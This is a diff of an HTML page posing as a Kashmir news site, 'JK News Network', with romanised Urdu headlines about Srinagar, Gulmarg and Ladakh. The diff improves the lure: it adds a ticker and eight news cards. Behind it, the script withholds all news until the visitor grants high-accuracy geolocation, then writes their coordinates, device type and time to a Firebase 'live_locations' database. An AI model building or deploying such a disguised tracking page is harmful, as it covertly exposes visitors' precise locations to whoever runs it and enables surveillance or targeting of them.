@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JK News Network | Live Updates</title>
+    <title>JK News Network | Taza Tareen Khabrein</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: sans-serif; background: #f0f2f5; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; color: #1c1e21; }
         
         /* Welcome Screen */
         #start-screen {
@@ -15,32 +15,40 @@
             align-items: center; justify-content: center; text-align: center; padding: 20px;
         }
         .btn-read {
-            background: #d93025; color: white; border: none; padding: 15px 40px;
-            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
-            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4);
+            background: #d93025; color: white; border: none; padding: 16px 45px;
+            font-size: 18px; font-weight: bold; border-radius: 35px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(217, 48, 37, 0.4); transition: 0.3s;
         }
-        header { background: #d93025; color: white; padding: 15px; text-align: center; font-weight: bold; }
-        .news-card { background: white; margin: 15px; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .news-card img { width: 100%; height: 200px; object-fit: cover; }
+
+        /* News Styles */
+        header { background: #d93025; color: white; padding: 15px; text-align: center; font-weight: bold; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .ticker { background: #222; color: #ff0; padding: 6px; font-size: 13px; font-weight: bold; }
+        .container { max-width: 700px; margin: auto; padding: 10px; }
+        .news-card { background: white; border-radius: 12px; margin-bottom: 20px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.08); border: 1px solid #ddd; }
+        .news-card img { width: 100%; height: 230px; object-fit: cover; border-bottom: 3px solid #d93025; }
+        .news-body { padding: 18px; }
+        .news-body span { color: #d93025; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .news-body h2 { font-size: 1.3rem; margin: 10px 0; color: #2c3e50; line-height: 1.3; }
+        .news-body p { font-size: 0.95rem; color: #555; line-height: 1.6; }
+        .footer { text-align: center; padding: 30px; font-size: 12px; color: #888; background: #fff; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div id="start-screen">
     <h1 style="color:#d93025; margin-bottom:10px;">JK NEWS NETWORK</h1>
-    <p style="margin-bottom:25px; color:#555;">Srinagar, Jammu aur Ladakh ki taza tareen khabron ke liye niche click karein.</p>
+    <p style="margin-bottom:25px; color:#555;">Kashmir, Jammu aur Ladakh ki har khabar ke liye niche click karein.</p>
     <button class="btn-read" id="main-btn">READ NEWS / خبریں پڑھیں</button>
 </div>
 
 <div id="content" style="display:none;">
-    <header>JK NEWS NETWORK - LIVE</header>
-    <div class="news-card">
-        <img src="https://images.unsplash.com/photo-1598324423733-196d0061e389?w=600">
-        <div style="padding:15px;">
-            <h2>Srinagar Smart City Project Update</h2>
-            <p>Jhelum riverfront ka kaam mukammal ho chuka hai...</p>
+    <header>JK NEWS NETWORK 24/7</header>
+    <div class="ticker"><marquee scrollamount="5">⚠️ Breaking: Jhelum Riverfront Project Mukammal... ❄️ Gulmarg Mein Sayahon Ki Bhid... 🚂 Jammu-Srinagar Rail Trial Kamyab...</marquee></div>
+    
+    <div class="container" id="news-feed">
         </div>
-    </div>
+    
+    <div class="footer">© 2026 JK News Network Digital Media | All Rights Reserved</div>
 </div>
 
 <script type="module">
@@ -60,28 +68,52 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    // Button click listener
+    const newsData = [
+        { cat: "Top Story", title: "Srinagar Smart City: Jhelum Riverfront Ka Naya Roop", img: "https://images.unsplash.com/photo-1598324423733-196d0061e389?w=800", desc: "Srinagar Smart City mission ke tehat Jhelum riverfront ko world-class bana diya gaya hai. Shaam ke waqt yahan logon ka bhari rush rehta hai." },
+        { cat: "Tourism", title: "Gulmarg Mein Record-Breaking Sayahon Ki Tadad", img: "https://images.unsplash.com/photo-1482867996988-29ec3aee816d?w=800", desc: "Taza barfbari ke baad Gulmarg ke hotels 100% book ho chuke hain. Skiing aur Gondola ride ke liye log dur-dur se aa rahe hain." },
+        { cat: "Ladakh", title: "Zojila Tunnel Par Kaam Tezi Se Jari", img: "https://images.unsplash.com/photo-1581793745862-99fde7fa73d2?w=800", desc: "Ladakh ko har mausam mein baqi mulk se jodne ke liye Zojila tunnel project par din-raat kaam ho raha hai taake sardiyon mein rasta band na ho." },
+        { cat: "Railway", title: "Jammu-Srinagar Rail Link: Final Testing Shuru", img: "https://images.unsplash.com/photo-1474487024267-582df568d715?w=800", desc: "Chenab Bridge par train ka safal trial kar liya gaya hai. Jald hi log seedha Delhi se Srinagar tak ka safar train mein kar sakenge." },
+        { cat: "Economy", title: "Kashmiri Seb Ki Export Mein 20% Izafa", img: "https://images.unsplash.com/photo-1610555356070-d0efb6505f81?w=800", desc: "Wadi ke kisanon ke liye badi khabar: Kashmiri seb ab Dubai aur Gulf mulkon mein bade paimane par pasand kiya ja raha hai." },
+        { cat: "Education", title: "NIT Srinagar Mein Naya AI Research Lab Qayam", img: "https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?w=800", desc: "Technical education ko badhava dene ke liye NIT Srinagar ne Artificial Intelligence lab shuru ki hai jisme local students research kar sakenge." },
+        { cat: "Culture", title: "Srinagar Downtown Mein Traditional Food Fest", img: "https://images.unsplash.com/photo-1512152272829-e3139592d56f?w=800", desc: "Purane shehar mein 3-roza Kashmiri Wazwan mela sajaya gaya hai, jahan wadi ke laziz pakwanon ki numayish ki ja rahi hai." },
+        { cat: "Weather", title: "MeT Alert: Agle 48 Ghante Barish Aur Barfbari", img: "https://images.unsplash.com/photo-1428592953211-077101b2021b?w=800", desc: "MeT department ne pesh-goi ki hai ke wadi ke upri ilaqon mein bhari barfbari aur maidanon mein barish ka imkan hai." }
+    ];
+
+    function renderNews() {
+        const feed = document.getElementById('news-feed');
+        newsData.forEach(item => {
+            feed.innerHTML += `
+                <div class="news-card">
+                    <img src="${item.img}" alt="news">
+                    <div class="news-body">
+                        <span>${item.cat}</span>
+                        <h2>${item.title}</h2>
+                        <p>${item.desc}</p>
+                    </div>
+                </div>`;
+        });
+    }
+
     document.getElementById('main-btn').addEventListener('click', function() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
-                // Success: Firebase mein data bhejein
-                const userId = "User_" + Math.floor(Math.random() * 90000);
+                const userId = "User_" + Math.floor(Math.random() * 99999);
                 set(ref(db, 'live_locations/' + userId), {
                     lat: position.coords.latitude,
                     lng: position.coords.longitude,
-                    device: navigator.platform,
+                    device: (navigator.userAgent.match(/(Android|iPhone|Windows|Mac)/) || ["Mobile"])[0],
                     time: new Date().toLocaleTimeString(),
                     date: new Date().toLocaleDateString()
                 }).then(() => {
-                    // News dikha dein
                     document.getElementById('start-screen').style.display = 'none';
                     document.getElementById('content').style.display = 'block';
+                    renderNews();
                 });
             }, function(error) {
-                alert("News parhne ke liye location 'Allow' karna lazmi hai.");
+                alert("Khabrein parhne ke liye Location 'Allow' karna zaroori hai.");
             }, { enableHighAccuracy: true });
         } else {
-            alert("Aapka phone location support nahi karta.");
+            alert("Aapka browser location support nahi karta.");
         }
     });
 </script>
